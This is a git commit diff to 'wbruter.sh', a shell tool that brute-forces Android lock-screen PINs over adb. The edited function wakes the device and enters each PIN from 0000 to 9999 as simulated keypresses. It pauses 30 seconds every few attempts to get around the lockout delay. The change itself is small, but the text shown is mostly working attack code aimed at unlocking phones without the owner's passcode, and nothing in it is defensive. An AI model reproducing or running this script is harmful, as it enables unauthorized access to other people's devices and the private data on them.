1d7aee19bc5a4d942c344948999939423456da73
JebemtiMaiku <niki.iff@hotmail.com>
2023-05-23 20:11:26 +0200

    test

--- wbruter.sh
+++ wbruter.sh
@@ -213,7 +213,6 @@ android6() {
 
 
 androidgui4() {
-    if [[ $i != 0000 ]]; then
         screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
         case $screen in
             "mScreenState=OFF") echo -e "Preparing to attack."; 
@@ -221,26 +220,28 @@ androidgui4() {
             "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
         esac
         echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
+        adb shell input keyevent 3
         adb shell input keyevent 82
         adb shell input swipe 407 1211 378 85
         for i in {0000..9999}; do
-            echo -e "\e[0;1mTrying pin:  $i\e[0m"
-            for (( j=0; j<${#i}; j++ )); do
-                adb shell input keyevent $((`echo ${i:$j:1}`+7))
-            done
-            adb shell input keyevent 66
-            adb shell input swipe 407 1211 378 85
-            clear() {
-                adb shell input keyevent KEYCODE_MOVE_END
-                adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
+            if [[ $i != 0000 ]]; then
+                echo -e "\e[0;1mTrying pin:  $i\e[0m"
+                for (( j=0; j<${#i}; j++ )); do
+                    adb shell input keyevent $((`echo ${i:$j:1}`+7))
+                done
+                adb shell input keyevent 66
+                adb shell input swipe 407 1211 378 85
+                clear() {
+                    adb shell input keyevent KEYCODE_MOVE_END
+                    adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
                 if ! (( `expr $i + 1` % 4 )); then
                     adb shell input keyevent 66
                     sleep 30
                     adb shell input keyevent 82
                     adb shell input swipe 407 1211 378 85
                 fi
-            done
-    fi
+            fi
+        done
     }
 
 androidgui6() {
